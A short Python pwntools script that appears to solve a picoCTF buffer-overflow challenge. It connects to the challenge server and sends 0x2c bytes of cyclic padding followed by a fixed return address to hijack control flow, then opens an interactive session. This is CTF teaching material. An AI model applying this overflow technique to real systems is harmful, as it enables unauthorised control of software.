from pwn import *

# io = process('./vuln')
io = remote('saturn.picoctf.net', 60847)

io.sendlineafter(b'Please enter your string:', cyclic(0x2c) + p32(0x80491f6))

io.interactive()